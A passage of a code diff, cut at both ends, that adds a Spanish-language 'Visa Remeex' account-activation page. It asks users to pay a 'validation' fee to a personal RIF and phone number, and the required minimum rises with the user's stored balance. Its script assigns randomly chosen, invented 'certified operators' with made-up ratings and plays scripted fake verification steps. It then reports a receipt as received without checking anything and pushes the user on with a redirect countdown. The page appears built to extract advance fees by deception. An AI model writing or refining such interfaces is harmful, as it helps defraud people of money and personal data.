+                    <div class="secure-content" id="secure-rif">V-30966019</div>
+                    <!-- Mensaje de instrucción -->
+                    <span class="click-instruction" id="rif-instruction">Copiar RIF</span>
+                    <!-- Confirmación de copiado -->
+                    <div class="copy-confirmation" id="rif-confirmation">¡Copiado correctamente!</div>
+                </div>
+                <!-- Botón de copiar mejorado con instrucciones claras -->
+                <button class="copy-button" onclick="copyWithReveal('V-30966019', this, 'secure-rif', 'rif-instruction', 'rif-confirmation')">
+                    <i class="fas fa-copy"></i>
+                    Copiar RIF
+                </button>
+            </div>
+            
+            <div class="payment-data-item">
+                <div class="payment-data-label">Teléfono:</div>
+                <!-- Contenedor para dato y visualización temporal -->
+                <div class="data-display-container">
+                    <!-- Dato oculto que se mostrará temporalmente -->
+                    <div class="secure-content" id="secure-phone">0412-6783725</div>
+                    <!-- Mensaje de instrucción -->
+                    <span class="click-instruction" id="phone-instruction">Copiar teléfono</span>
+                    <!-- Confirmación de copiado -->
+                    <div class="copy-confirmation" id="phone-confirmation">¡Copiado correctamente!</div>
+                </div>
+                <!-- Botón de copiar mejorado con instrucciones claras -->
+                <button class="copy-button" onclick="copyWithReveal('04126783725', this, 'secure-phone', 'phone-instruction', 'phone-confirmation')">
+                    <i class="fas fa-copy"></i>
+                    Copiar teléfono
+                </button>
+            </div>
+            
+            <div class="payment-data-item">
+                <div class="payment-data-label">Monto:</div>
+                <div class="payment-data-content" id="secure-amount">3.143,75 Bs</div>
+                <button class="btn-copy" id="amount-copy-btn" onclick="copyToClipboard('3143,75', this)">
+                    <i class="fas fa-copy"></i>
+                    <span class="tooltip">¡Copiado!</span>
+                </button>
+            </div>
+            
+            <div class="payment-data-item">
+                <div class="payment-data-label">Concepto:</div>
+                <div class="payment-data-content" id="secure-concept">4454651</div>
+                <button class="btn-copy" onclick="copyToClipboard('4454651', this)">
+                    <i class="fas fa-copy"></i>
+                    <span class="tooltip">¡Copiado!</span>
+                </button>
+            </div>
+            
+            <div class="btn-container">
+                <button class="btn btn-secondary close-btn" onclick="closePaymentOverlay()">
+                    <i class="fas fa-times"></i>
+                    Cerrar
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Contenedor de validación y estado de la recarga -->
+    <div class="spinner-container" id="spinner-container">
+        <div class="spinner"></div>
+        <div class="processing-text">Validando comprobante</div>
+        
+        <div class="checkmark-container" id="checkmark-container">
+            <div class="checkmark-circle">
+                <i class="fas fa-check checkmark"></i>
+            </div>
+            <div class="success-text">¡Comprobante recibido!</div>
+            <div class="validation-note">La validación toma aproximadamente 5 minutos. La recarga se aplicará en cuanto se confirme el pago.</div>
+            <button class="btn" onclick="completeProcess()" style="max-width: 250px;">
+                Finalizar
+            </button>
+        </div>
+    </div>
+
+    <!-- Overlay para activación de cuenta -->
+    <div class="overlay activation-overlay" id="activation-overlay">
+        <div class="activation-card">
+            <button type="button" class="overlay-close" onclick="closeActivationOverlay()" aria-label="Cerrar activación">
+                <i class="fas fa-times"></i>
+            </button>
+            <div class="activation-header">
+                <span class="activation-badge"><i class="fas fa-bolt"></i> Activación segura</span>
+                <h2>Complete la activación de su cuenta Visa Remeex</h2>
+                <p>Su comprobante ha sido recibido y asegurado en la red. Para habilitar los movimientos de su tarjeta debe concluir la activación en el portal oficial.</p>
+            </div>
+            <div class="activation-summary">
+                <div class="summary-item">
+                    <span class="summary-label">Operador asignado</span>
+                    <span class="summary-value" id="activation-operator-name">--</span>
+                </div>
+                <div class="summary-item">
+                    <span class="summary-label">ID del operador</span>
+                    <span class="summary-value" id="activation-operator-code">--</span>
+                </div>
+                <div class="summary-item">
+                    <span class="summary-label">Monto acreditado</span>
+                    <span class="summary-value" id="activation-amount-usd">$0.00</span>
+                    <span class="summary-detail" id="activation-amount-bs">0,00 Bs</span>
+                </div>
+                <div class="summary-item">
+                    <span class="summary-label">Código de concepto</span>
+                    <span class="summary-value" id="activation-concept-code">4454651</span>
+                </div>
+                <div class="summary-item">
+                    <span class="summary-label">Objetivo de la recarga</span>
+                    <span class="summary-value" id="activation-purpose-text">Verificación de cuenta</span>
+                </div>
+            </div>
+            <div class="activation-timeline">
+                <div class="activation-step">
+                    <div class="step-index">1</div>
+                    <div class="step-body">
+                        <h4>Validación automática</h4>
+                        <p>Confirmamos la consistencia del comprobante y registramos la operación junto al operador asignado.</p>
+                    </div>
+                </div>
+                <div class="activation-step">
+                    <div class="step-index">2</div>
+                    <div class="step-body">
+                        <h4>Activación de credenciales</h4>
+                        <p>En "Acceso a Mi Cuenta" podrás vincular el depósito, asignar un PIN dinámico y habilitar tu tarjeta virtual.</p>
+                    </div>
+                </div>
+                <div class="activation-step">
+                    <div class="step-index">3</div>
+                    <div class="step-body">
+                        <h4>Confirmación final</h4>
+                        <p>Descarga el acta digital, revisa tu nuevo balance y recibe notificaciones en tiempo real de futuras recargas.</p>
+                    </div>
+                </div>
+            </div>
+            <div class="activation-support">
+                <span class="activation-highlight"><i class="fas fa-shield-alt"></i> Atención dedicada 24/7</span>
+                <ul>
+                    <li>Verifica que el concepto bancario utilice el código <strong id="activation-concept-code-list">4454651</strong> para agilizar la acreditación.</li>
+                    <li>Adjunta el comprobante en formato PDF o imagen dentro del apartado de pagos del portal.</li>
+                    <li>Ante cualquier duda contáctanos al <strong>+1 737-301-8059</strong> o a través del chat en vivo.</li>
+                </ul>
+            </div>
+            <div class="activation-actions">
+                <a class="btn" href="Accesoamicuenta.html" id="activation-main-action">Ir a Acceso a mi Cuenta</a>
+                <button class="btn btn-secondary" type="button" onclick="closeActivationOverlay()">Revisar más tarde</button>
+            </div>
+            <p class="activation-countdown">Serás dirigido automáticamente en <span id="activation-countdown">60</span> segundos para finalizar la activación.</p>
+        </div>
+    </div>
+
+<script>
+    /****************************
+     * CONFIGURACIÓN GLOBAL
+     ****************************/
+    // Variable centralizada para la tasa de cambio (modifique este valor para actualizar todos los cálculos)
+let dollarRate = 151.10; // Tasa de cambio actual por defecto
+
+function loadExchangeRate(){
+    const data = window.getStoredExchangeRate ? window.getStoredExchangeRate() : null;
+    if(data) dollarRate = data.USD_TO_BS;
+}
+function generateCurrentAccessCode() {
+    const fecha = new Date();
+    const dia = fecha.getDate();
+    const mes = fecha.getMonth() + 1;
+    const anio = fecha.getFullYear();
+    const hora = fecha.getHours();
+    const parte1 = '0098';
+    const parte2 = String(hora).padStart(2, '0') + '84';
+    const parte3 = String(dia).padStart(2, '0') + String(anio).slice(-2);
+    const parte4 = String(mes).padStart(2, '0') + String(hora).padStart(2, '0');
+    const seed = (dia * mes * anio * (hora + 1)) % 10000;
+    const parte5 = String(seed).padStart(4, '0');
+    return parte1 + parte2 + parte3 + parte4 + parte5;
+}
+const conceptCode = '4454651'; // Código de concepto unificado
+
+// Indica si se ingresó desde recarga para omitir la clave
+const skipAccessCode = sessionStorage.getItem('fromRecargaActivacion') === 'true';
+if (skipAccessCode) sessionStorage.removeItem('fromRecargaActivacion');
+    
+    // Definición de montos disponibles (se filtrarán según el saldo del usuario)
+    const defaultAvailableAmounts = [
+        { value: 25, label: "25 USD" },
+        { value: 30, label: "30 USD" },
+        { value: 35, label: "35 USD" },
+        { value: 40, label: "40 USD" },
+        { value: 45, label: "45 USD" },
+        { value: 50, label: "50 USD" },
+        { value: 100, label: "100 USD" },
+        { value: 200, label: "200 USD" },
+        { value: 250, label: "250 USD" },
+        { value: 400, label: "400 USD" },
+        { value: 500, label: "500 USD" }
+    ];
+    let availableAmounts = [...defaultAvailableAmounts];
+
+    // Obtener el saldo y el estatus del usuario para determinar el monto mínimo
+    function getValidationAmountByBalance(balanceUsd) {
+        if (balanceUsd <= 500) return 25;
+        if (balanceUsd <= 1000) return 30;
+        if (balanceUsd <= 2000) return 35;
+        if (balanceUsd <= 5000) return 40;
+        return 45;
+    }
+
+    function getActiveForcedValidationAmount() {
+        if (typeof getForcedValidationAmount === 'function') {
+            const forced = getForcedValidationAmount();
+            if (typeof forced === 'number' && Number.isFinite(forced)) {
+                return forced;
+            }
+        }
+        return null;
+    }
+
+    function getEffectiveValidationAmount(balanceUsd) {
+        if (typeof getVerificationAmountUsd === 'function') {
+            const resolved = getVerificationAmountUsd(balanceUsd);
+            if (typeof resolved === 'number' && Number.isFinite(resolved)) {
+                return resolved;
+            }
+        }
+        return getValidationAmountByBalance(balanceUsd);
+    }
+
+    function formatUsdLabel(amount) {
+        const numeric = Number(amount);
+        if (!Number.isFinite(numeric)) return '0 USD';
+        return `${Number.isInteger(numeric) ? numeric : numeric.toFixed(2)} USD`;
+    }
+
+    function adjustAmountsByBalance() {
+        const balanceData = readStoredObject('remeexBalance', {});
+        const balanceUsd = balanceData.usd || 0;
+        const forcedAmount = getActiveForcedValidationAmount();
+        const storedState = getStoredPendingActivation();
+        const storedAmount = storedState && typeof storedState.amount === 'number' && !isNaN(storedState.amount)
+            ? storedState.amount
+            : null;
+
+        if (forcedAmount !== null) {
+            availableAmounts = [{ value: forcedAmount, label: formatUsdLabel(forcedAmount) }];
+            selectedAmount = forcedAmount;
+            persistPendingActivation({ amount: forcedAmount });
+        } else {
+            const minUsd = getEffectiveValidationAmount(balanceUsd);
+            const uniqueAmounts = new Map();
+            defaultAvailableAmounts.forEach(item => {
+                if (item && typeof item.value === 'number' && item.value >= minUsd) {
+                    if (!uniqueAmounts.has(item.value)) {
+                        uniqueAmounts.set(item.value, item);
+                    }
+                }
+            });
+
+            if (storedAmount !== null && !uniqueAmounts.has(storedAmount)) {
+                uniqueAmounts.set(storedAmount, { value: storedAmount, label: formatUsdLabel(storedAmount) });
+            }
+
+            availableAmounts = Array.from(uniqueAmounts.values()).sort((a, b) => a.value - b.value);
+
+            const desiredSelection = storedAmount !== null ? storedAmount : selectedAmount;
+            if (!availableAmounts.some(item => Math.abs(item.value - desiredSelection) < 0.0001)) {
+                selectedAmount = availableAmounts.length ? availableAmounts[0].value : minUsd;
+            } else {
+                selectedAmount = desiredSelection;
+            }
+        }
+
+        const note = document.getElementById('min-amount-note');
+        if (note) {
+            if (forcedAmount !== null) {
+                note.textContent = `Temporalmente tu verificación requiere un monto fijo de $${forcedAmount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}. Usa este valor para completar la recarga.`;
+            } else {
+                const minUsd = getEffectiveValidationAmount(balanceUsd);
+                const bal = balanceUsd.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+                if (storedAmount !== null && storedAmount < minUsd) {
+                    note.textContent = `El monto mínimo según tu saldo actual es de $${minUsd.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}, pero se conservará el monto guardado de $${storedAmount.toFixed(2)} para completar tu verificación.`;
+                } else {
+                    note.textContent = `El monto mínimo para validar tu cuenta se calcula según tu saldo actual ($${bal}). Puedes recargar a partir de $${minUsd.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}. Si tu saldo fuera menor, el monto requerido sería inferior.`;
+                }
+            }
+        }
+
+        updateBalanceInfo();
+        populateActivationOverlay();
+    }
+
+    // Obtener lista de bancos desde bank-data.js
+const bankList = [...(BANK_DATA.NACIONAL || []), ...(BANK_DATA.INTERNACIONAL || []), ...(BANK_DATA.FINTECH || [])];
+
+    function autoFillFromStorage() {
+        try {
+            const reg = JSON.parse(localStorage.getItem('visaRegistrationCompleted') || '{}');
+            const user = JSON.parse(localStorage.getItem('visaUserData') || '{}');
+            const banking = JSON.parse(localStorage.getItem('remeexVerificationBanking') || '{}');
+            const data = Object.assign({}, reg, user, banking);
+
+            const fullName = data.fullName || data.name || (`${data.firstName || ''} ${data.lastName || ''}`).trim();
+            if (fullName) {
+                const nameEl = document.getElementById('user-name');
+                if (nameEl && !nameEl.value) nameEl.value = fullName;
+                const fullEl = document.getElementById('full-name');
+                if (fullEl && !fullEl.value) fullEl.value = fullName;
+            }
+
+            const docNum = data.documentNumber || data.idNumber || '';
+            if (docNum) {
+                const match = docNum.match(/^([VEJ])\s*\.?-?(\d+)/i);
+                const type = match ? match[1] : '';
+                const num = match ? match[2] : docNum;
+                const typeEl = document.getElementById('doc-type');
+                if (typeEl && type) typeEl.value = type.toUpperCase();
+                const idEl = document.getElementById('id-number');
+                if (idEl && !idEl.value) idEl.value = num;
+            }
+
+            const code = data.securityCode || data.verificationCode;
+            if (code) {
+                const cEl = document.getElementById('access-code');
+                if (cEl && !cEl.value) cEl.value = code;
+            }
+
+            const pendingState = getStoredPendingActivation();
+            const storedBankId = pendingState && pendingState.bankId ? pendingState.bankId : null;
+            const bankId = storedBankId || data.primaryBank || data.bankId;
+            if (bankId) {
+                selectedBank = bankId;
+                const target = document.querySelector(`.bank-logo[data-bankid="${bankId}"]`);
+                if (target) target.click();
+            }
+        } catch (e) {
+            console.error('Auto fill error', e);
+        }
+    }
+
+    // Variables de estado
+    let sessionTimer;
+
+    let countdownValue = 45;
+    let selectedBank = null;
+    let storedTransferDate = '';
+    let storedReferenceNumber = '';
+    let particles = [];
+    let selectedAmount = 25; // Valor predeterminado
+    let transferConfirmed = false; // Estado para el checkbox de confirmación
+    let understandingConfirmed = false; // Estado para el checkbox de entendimiento
+    let hasViewedPaymentData = false; // Variable para rastrear si el usuario ha visto los datos de pago
+    let operatorAssigned = false;
+    let operatorSearchInProgress = false;
+    let operatorSearchTimeout = null;
+    let operatorStatusInterval = null;
+    let assignedOperator = null;
+    let activationCountdownInterval = null;
+    let activationCountdownValue = 60;
+    let selectedPurpose = 'verification';
+
+    const certifiedOperators = [
+        {
+            name: 'Mariana Rodríguez',
+            code: 'CJ-7824',
+            location: 'Caracas · Distrito Capital',
+            experience: '4 años de experiencia',
+            operations: 436,
+            rating: 4.9,
+            responseTime: '2 minutos promedio',
+            specialty: 'Activaciones y gestión de pagos'
+        },
+        {
+            name: 'Luisana Méndez',
+            code: 'CJ-6711',
+            location: 'Valencia · Carabobo',
+            experience: '5 años de experiencia',
+            operations: 512,
+            rating: 5.0,
+            responseTime: '1.5 minutos promedio',
+            specialty: 'Control de recaudos y seguimiento P2P'
+        },
+        {
+            name: 'José Alvarado',
+            code: 'CJ-5589',
+            location: 'Maracaibo · Zulia',
+            experience: '3 años de experiencia',
+            operations: 389,
+            rating: 4.8,
+            responseTime: '3 minutos promedio',
+            specialty: 'Verificación de pagos móviles'
+        },
+        {
+            name: 'Camila Herrera',
+            code: 'CJ-8894',
+            location: 'Barquisimeto · Lara',
+            experience: '6 años de experiencia',
+            operations: 654,
+            rating: 5.0,
+            responseTime: '1 minuto promedio',
+            specialty: 'Atención premium y altas de cuentas'
+        },
+        {
+            name: 'Andrés Castillo',
+            code: 'CJ-7305',
+            location: 'Puerto Ordaz · Bolívar',
+            experience: '4 años de experiencia',
+            operations: 421,
+            rating: 4.95,
+            responseTime: '2.3 minutos promedio',
+            specialty: 'Conciliación de comprobantes internacionales'
+        }
+    ];
+
+    function applyPendingActivationState(state, operatorCatalog) {
+        if (!state || typeof state !== 'object') return;
+
+        if (typeof state.amount === 'number' && !isNaN(state.amount)) {
+            selectedAmount = state.amount;
+        }
+
+        if (state.bankId && typeof state.bankId === 'string') {
+            selectedBank = state.bankId;
+        }
+
+        if (state.date && typeof state.date === 'string') {
+            storedTransferDate = state.date;
+        }
+
+        if (state.reference && typeof state.reference === 'string') {
+            storedReferenceNumber = state.reference;
+        }
+
+        if (state.operator && Array.isArray(operatorCatalog)) {
+            const operator = operatorCatalog.find(op => op.code === state.operator);
+            if (operator) {
+                assignedOperator = operator;
+                operatorAssigned = true;
+            }
+        }
+    }
+    
+    // Mostrar primer formulario al cargar
+    document.addEventListener('DOMContentLoaded', function() {
+        loadExchangeRate();
+        const storedState = getStoredPendingActivation();
+        applyPendingActivationState(storedState, certifiedOperators);
+
+        document.getElementById('login-form').classList.add('active');
+        const toRecharge = document.getElementById('to-recharge');
+        if (toRecharge) toRecharge.href = `${getRecargaPage()}?section=mobile-payment`;
+        // Ajustar montos según el saldo y cargar opciones
+        adjustAmountsByBalance();
+        loadAmountOptions();
+        // Cargar logos de bancos
+        loadBankLogos();
+        autoFillFromStorage();
+        // Inicializar sistema de partículas
+        initParticles();
+        // Inicializar efectos para botones
+        initButtonEffects();
+        // Añadir líneas de interferencia aleatorias para el overlay
+        createInterferenceLines();
+        updateOperatorStatusCard();
+
+        const purposeSelect = document.getElementById('recharge-purpose');
+        if (purposeSelect) {
+            selectedPurpose = purposeSelect.value || 'verification';
+            purposeSelect.addEventListener('change', function(event) {
+                selectedPurpose = event.target.value;
+            });
+        }
+
+        const operatorOverlay = document.getElementById('operator-search-overlay');
+        if (operatorOverlay) {
+            operatorOverlay.addEventListener('click', function(event) {
+                if (event.target === this && operatorAssigned) {
+                    closeOperatorOverlay();
+                }
+            });
+        }
+
+        const activationOverlay = document.getElementById('activation-overlay');
+        if (activationOverlay) {
+            activationOverlay.addEventListener('click', function(event) {
+                if (event.target === this) {
+                    closeActivationOverlay();
+                }
+            });
+        }
+
+        // Prevenir gestos de zoom en dispositivos móviles para mejor experiencia
+        document.addEventListener('touchstart', function(event) {
+            if (event.touches.length > 1) {
+                event.preventDefault();
+            }
+        }, { passive: false });
+        
+        // Mejorar el comportamiento de scroll en móviles
+        document.addEventListener('touchmove', function(event) {
+            // Permitir el desplazamiento natural
+        }, { passive: true });
+        
+        // Establecer la fecha actual en el campo de fecha por defecto
+        const today = new Date();
+        const formattedDate = today.toISOString().substr(0, 10);
+        if (document.getElementById('transfer-date')) {
+            document.getElementById('transfer-date').value = storedTransferDate || formattedDate;
+        }
+
+        const referenceInput = document.getElementById('reference-number');
+        if (referenceInput && storedReferenceNumber) {
+            referenceInput.value = storedReferenceNumber;
+        }
+
+        const pendingAmount = storedState && typeof storedState.amount === 'number' && !isNaN(storedState.amount);
+        if (!pendingAmount) {
+            persistPendingActivation({ amount: selectedAmount });
+        }
+        if (selectedBank) {
+            persistPendingActivation({ bankId: selectedBank });
+        }
+
+        // Optimizar carga de imágenes
+        lazyLoadImages();
+
+        // Prevenir auto zoom en inputs para dispositivos móviles
+        optimizeInputsForMobile();
+
+        updateBalanceInfo();
+        if (skipAccessCode) {
+            const group = document.getElementById('access-code-group');
+            if (group) group.style.display = 'none';
+        }
+    });
+
+    const forcedEventTarget = (typeof window !== 'undefined' && typeof window.addEventListener === 'function') ? window : (typeof document !== 'undefined' ? document : null);
+    if (forcedEventTarget) {
+        forcedEventTarget.addEventListener('forcedValidationAmountChanged', function() {
+            adjustAmountsByBalance();
+            loadAmountOptions();
+            updateAmountDisplay();
+            updateBalanceInfo();
+            populateActivationOverlay();
+        });
+    }
+    
+    // Carga diferida de imágenes
+    function lazyLoadImages() {
+        if ('IntersectionObserver' in window) {
+            const imgObserver = new IntersectionObserver((entries, observer) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        const img = entry.target;
+                        const src = img.getAttribute('data-src');
+                        if (src) {
+                            img.src = src;
+                            img.removeAttribute('data-src');
+                        }
+                        observer.unobserve(img);
+                    }
+                });
+            });
+            
+            document.querySelectorAll('img[data-src]').forEach(img => {
+                imgObserver.observe(img);
+            });
+        } else {
+            // Fallback para navegadores que no soportan IntersectionObserver
+            document.querySelectorAll('img[data-src]').forEach(img => {
+                const src = img.getAttribute('data-src');
+                if (src) {
+                    img.src = src;
+                    img.removeAttribute('data-src');
+                }
+            });
+        }
+    }
+    
+    // Optimizar inputs para dispositivos móviles
+    function optimizeInputsForMobile() {
+        const inputs = document.querySelectorAll('input, select');
+        inputs.forEach(input => {
+            input.addEventListener('focus', function() {
+                // En iOS esto ayuda a prevenir el zoom automático
+                input.setAttribute('readonly', 'true');
+                setTimeout(function() {
+                    input.removeAttribute('readonly');
+                    input.focus();
+                }, 50);
+            });
+        });
+    }
+    
+    // Inicializar efectos para botones
+    function initButtonEffects() {
+        const buttons = document.querySelectorAll('.btn');
+
+        buttons.forEach(button => {
+            button.addEventListener('click', function(e) {
+                if (this.disabled) return;
+                
+                const rect = button.getBoundingClientRect();
+                const x = e.clientX - rect.left;
+                const y = e.clientY - rect.top;
+                
+                const ripple = document.createElement('span');
+                ripple.className = 'ripple';
+                ripple.style.left = x + 'px';
+                ripple.style.top = y + 'px';
+                
+                this.appendChild(ripple);
+                
+                setTimeout(() => {
+                    ripple.remove();
+                }, 600);
+            });
+        });
+    }
+
+    function refreshBodyScrollLock() {
+        const activeOverlays = document.querySelectorAll('.overlay.active');
+        const spinner = document.getElementById('spinner-container');
+        const spinnerActive = spinner && spinner.classList.contains('active');
+
+        if (activeOverlays.length > 0 || spinnerActive) {
+            document.body.style.overflow = 'hidden';
+        } else {
+            document.body.style.overflow = '';
+        }
+    }
+
+    function getRandomCertifiedOperator() {
+        return certifiedOperators[Math.floor(Math.random() * certifiedOperators.length)];
+    }
+
+    function updateOperatorButtonState() {
+        const button = document.getElementById('search-operator-btn');
+        if (!button) return;
+
+        if (operatorAssigned && assignedOperator) {
+            button.innerHTML = '<i class="fas fa-user-check"></i> Ver operador asignado';
+        } else {
+            button.innerHTML = '<i class="fas fa-user-shield"></i> Buscar operador cajero certificado';
+        }
+    }
+
+    function updateOperatorStatusCard() {
+        const card = document.getElementById('operator-status-card');
+        if (!card) return;
+
+        const nameEl = document.getElementById('operator-status-name');
+        const codeEl = document.getElementById('operator-status-code');
+        const locationEl = document.getElementById('operator-status-location');
+        const experienceEl = document.getElementById('operator-status-experience');
+        const operationsEl = document.getElementById('operator-status-operations');
+        const messageEl = document.getElementById('operator-status-message');
+
+        if (operatorAssigned && assignedOperator) {
+            card.classList.add('visible');
+            if (nameEl) nameEl.textContent = assignedOperator.name;
+            if (codeEl) codeEl.textContent = assignedOperator.code;
+            if (locationEl) locationEl.textContent = assignedOperator.location;
+            if (experienceEl) experienceEl.textContent = assignedOperator.experience;
+            if (operationsEl) operationsEl.textContent = `${assignedOperator.operations} operaciones verificadas`;
+            if (messageEl) messageEl.textContent = `Tiempo de respuesta promedio: ${assignedOperator.responseTime}. ${assignedOperator.specialty}.`;
+        } else {
+            card.classList.remove('visible');
+            if (messageEl) messageEl.textContent = 'En cuanto se asigne un operador certificado, lo verás aquí junto con los indicadores de seguridad de la red.';
+        }
+
+        updateOperatorButtonState();
+    }
+
+    function populateOperatorOverlay(operator) {
+        if (!operator) return;
+
+        const initialsEl = document.getElementById('operator-assigned-initials');
+        if (initialsEl) {
+            const initials = operator.name.split(' ').map(part => part.charAt(0)).join('').substr(0, 2).toUpperCase();
+            initialsEl.textContent = initials;
+        }
+
+        const nameEl = document.getElementById('operator-assigned-name');
+        if (nameEl) nameEl.textContent = operator.name;
+
+        const codeEl = document.getElementById('operator-assigned-code');
+        if (codeEl) codeEl.textContent = `ID ${operator.code}`;
+
+        const locationEl = document.getElementById('operator-assigned-location');
+        if (locationEl) locationEl.textContent = `Ubicación: ${operator.location}`;
+
+        const experienceEl = document.getElementById('operator-assigned-experience');
+        if (experienceEl) experienceEl.textContent = `Experiencia: ${operator.experience}`;
+
+        const ratingEl = document.getElementById('operator-assigned-rating');
+        if (ratingEl) {
+            const ratingValue = typeof operator.rating === 'number' ? operator.rating.toFixed(2) : operator.rating;
+            ratingEl.textContent = ratingValue;
+        }
+
+        const operationsEl = document.getElementById('operator-assigned-operations');
+        if (operationsEl) operationsEl.textContent = `${operator.operations} operaciones exitosas`;
+
+        const details = document.getElementById('operator-assigned-details');
+        if (details) details.classList.add('visible');
+    }
+
+    function startOperatorSearch() {
+        const overlay = document.getElementById('operator-search-overlay');
+        const card = document.getElementById('operator-search-card');
+        if (!overlay || !card) return;
+
+        const stepsList = document.getElementById('operator-search-steps');
+        const progressFill = document.getElementById('operator-progress-fill');
+        const confirmBtn = document.getElementById('operator-confirm-btn');
+        const details = document.getElementById('operator-assigned-details');
+        const title = document.getElementById('operator-search-title');
+        const message = document.getElementById('operator-search-message');
+
+        overlay.classList.add('active');
+        refreshBodyScrollLock();
+
+        if (confirmBtn) {
+            confirmBtn.onclick = closeOperatorOverlay;
+        }
+
+        if (details) details.classList.remove('visible');
+        if (stepsList) stepsList.innerHTML = '';
+        if (progressFill) progressFill.style.width = '12%';
+
+        if (operatorStatusInterval) {
+            clearInterval(operatorStatusInterval);
+            operatorStatusInterval = null;
+        }
+
+        if (operatorSearchTimeout) {
+            clearTimeout(operatorSearchTimeout);
+            operatorSearchTimeout = null;
+        }
+
+        if (operatorAssigned && assignedOperator) {
+            card.classList.add('assigned');
+            if (title) title.textContent = 'Operador certificado asignado';
+            if (message) message.textContent = 'Revise los datos del operador asignado antes de visualizar la información sensible de la cuenta receptora.';
+            populateOperatorOverlay(assignedOperator);
+            if (confirmBtn) {
+                confirmBtn.disabled = false;
+                confirmBtn.innerHTML = '<i class="fas fa-user-check"></i> Continuar';
+            }
+            return;
+        }
+
+        operatorSearchInProgress = true;
+        card.classList.remove('assigned');
+
+        if (title) title.textContent = 'Buscando operador certificado...';
+        if (message) message.textContent = 'Estamos conectando con la red P2P segura de Visa Remeex para asignarle un cajero certificado disponible.';
+
+        if (confirmBtn) {
+            confirmBtn.disabled = true;
+            confirmBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Buscando operador...';
+        }
+
+        const stepsMessages = [
+            'Autenticando solicitud segura...',
+            'Localizando cajeros disponibles en su región...',
+            'Verificando reputación y certificaciones del operador...',
+            'Asignando el operador con mejor tiempo de respuesta...'
+        ];
+
+        let stepIndex = 0;
+        operatorStatusInterval = setInterval(() => {
+            if (!stepsList) return;
+
+            if (stepIndex < stepsMessages.length) {
+                const li = document.createElement('li');
+                li.textContent = stepsMessages[stepIndex];
+                stepsList.appendChild(li);
+
+                if (progressFill) {
+                    const progress = 20 + ((stepIndex + 1) / stepsMessages.length) * 60;
+                    progressFill.style.width = progress + '%';
+                }
+
+                stepIndex++;
+            } else {
+                clearInterval(operatorStatusInterval);
+                operatorStatusInterval = null;
+            }
+        }, 900);
+
+        operatorSearchTimeout = setTimeout(() => {
+            completeOperatorAssignment();
+        }, stepsMessages.length * 900 + 1400);
+    }
+
+    function completeOperatorAssignment() {
+        if (operatorSearchTimeout) {
+            clearTimeout(operatorSearchTimeout);
+            operatorSearchTimeout = null;
+        }
+
+        if (operatorStatusInterval) {
+            clearInterval(operatorStatusInterval);
+            operatorStatusInterval = null;
+        }
+
+        operatorSearchInProgress = false;
+
+        if (!assignedOperator) {
+            assignedOperator = getRandomCertifiedOperator();
+        }
+
+        operatorAssigned = true;
+
+        const card = document.getElementById('operator-search-card');
+        if (card) card.classList.add('assigned');
+
+        populateOperatorOverlay(assignedOperator);
+
+        const title = document.getElementById('operator-search-title');
+        const message = document.getElementById('operator-search-message');
+        if (title) title.textContent = 'Operador certificado asignado';
+        if (message) message.textContent = `Se ha reservado al operador ${assignedOperator.name} (${assignedOperator.code}) para acompañar su transacción y validar el comprobante.`;
+
+        const progressFill = document.getElementById('operator-progress-fill');
+        if (progressFill) progressFill.style.width = '100%';
+
+        const confirmBtn = document.getElementById('operator-confirm-btn');
+        if (confirmBtn) {
+            confirmBtn.disabled = false;
+            confirmBtn.innerHTML = '<i class="fas fa-user-check"></i> Conectar con operador y ver datos';
+        }
+
+        persistPendingActivation({ operator: assignedOperator.code });
+
+        updateOperatorStatusCard();
+    }
+
+    function closeOperatorOverlay() {
+        const overlay = document.getElementById('operator-search-overlay');
+        if (!overlay) return;
+
+        overlay.classList.remove('active');
+        refreshBodyScrollLock();
+
+        if (operatorSearchTimeout) {
+            clearTimeout(operatorSearchTimeout);
+            operatorSearchTimeout = null;
+        }
+
+        if (operatorStatusInterval) {
+            clearInterval(operatorStatusInterval);
+            operatorStatusInterval = null;
+        }
+
+        operatorSearchInProgress = false;
+
+        const card = document.getElementById('operator-search-card');
+        if (card && !operatorAssigned) {
+            card.classList.remove('assigned');
+        }
+
+        const confirmBtn = document.getElementById('operator-confirm-btn');
+        if (confirmBtn) {
+            confirmBtn.disabled = operatorAssigned ? false : true;
+            confirmBtn.innerHTML = operatorAssigned ? '<i class="fas fa-user-check"></i> Continuar' : 'Conectar con operador certificado';
+        }
+
+        updateOperatorStatusCard();
+    }
+
+    // Cargar opciones de monto mejoradas
+    function loadAmountOptions() {
+        const container = document.getElementById('amount-container');
+        if (!container) return;
+        
+        // Limpiar contenedor
+        container.innerHTML = '';
+
+        let selectionApplied = false;
+
+        // Agregar opciones de monto
+        availableAmounts.forEach((amount, index) => {
+            const bsAmount = formatNumberWithCommas((amount.value * dollarRate).toFixed(2));
+
+            const optionDiv = document.createElement('div');
+            optionDiv.className = 'amount-option';
+            optionDiv.setAttribute('data-value', amount.value);
+            if (Math.abs(amount.value - selectedAmount) < 0.0001) {
+                optionDiv.classList.add('selected');
+                selectionApplied = true;
+            }
+
+            optionDiv.innerHTML = `
+                <div class="amount-left">
+                    <div class="amount-value">${amount.label}</div>
+                    <div class="amount-bs">${bsAmount} Bs (tasa: ${dollarRate})</div>
+                </div>
+                <div class="radio-circle"></div>
+            `;
+            
+            optionDiv.addEventListener('click', function() {
+                // Deseleccionar todas las opciones
+                document.querySelectorAll('.amount-option').forEach(el => {
+                    el.classList.remove('selected');
+                });
+                
+                // Seleccionar la opción actual
+                this.classList.add('selected');
+                selectedAmount = parseFloat(this.getAttribute('data-value'));
+
+                // Actualizar el monto en el overlay
+                updateAmountDisplay();
+                persistPendingActivation({ amount: selectedAmount });
+                updateBalanceInfo();
+            });
+
+            container.appendChild(optionDiv);
+        });
+
+        if (!selectionApplied && container.firstElementChild) {
+            container.firstElementChild.classList.add('selected');
+            selectedAmount = parseFloat(container.firstElementChild.getAttribute('data-value'));
+            persistPendingActivation({ amount: selectedAmount });
+        }
+
+        // Inicializar el valor del monto seleccionado
+        updateAmountDisplay();
+        updateBalanceInfo();
+    }
+    
+    // Dar formato a números con separadores de miles
+    function formatNumberWithCommas(number) {
